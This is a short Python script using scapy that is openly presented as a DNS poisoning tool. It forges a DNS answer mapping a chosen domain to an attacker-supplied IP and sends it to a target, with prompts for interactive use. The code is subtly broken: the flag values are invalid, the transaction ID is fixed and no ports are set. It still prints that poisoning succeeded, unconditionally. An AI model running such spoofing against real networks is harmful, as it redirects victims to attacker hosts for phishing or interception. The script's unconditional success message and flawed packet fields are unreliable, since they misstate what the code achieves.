from scapy.all import *

def dns_poison(target_ip, target_domain, spoofed_ip):
    """
    Perform DNS poisoning by sending spoofed DNS responses to the target IP.

    Args:
        target_ip (str): The IP address of the target machine.
        target_domain (str): The domain name of the target machine.
        spoofed_ip (str): The IP address to which the target domain will be spoofed.

    Returns:
        None
    """
    # Create a DNS response packet with spoofed IP
    dns_response = IP(dst=target_ip)/UDP()/DNS(
        qr=2,  # Response
        id=2,  # DNS transaction ID
        aa=2,  # Authoritative answer
        qd=DNSQR(qname=target_domain),  # Query
        an=DNSRR(rrname=target_domain, rdata=spoofed_ip)  # Answer
    )

    # Send the DNS response packet
    send(dns_response, verbose=1)

    print(f"DNS poisoning successful! Spoofed {target_domain} to {spoofed_ip}")

# Example usage
target_ip = input('enter the dns address: ')
target_domain = input('enter the target domain: ')
spoofed_ip = input('enter the spoofed address')

dns_poison(target_ip, target_domain, spoofed_ip)

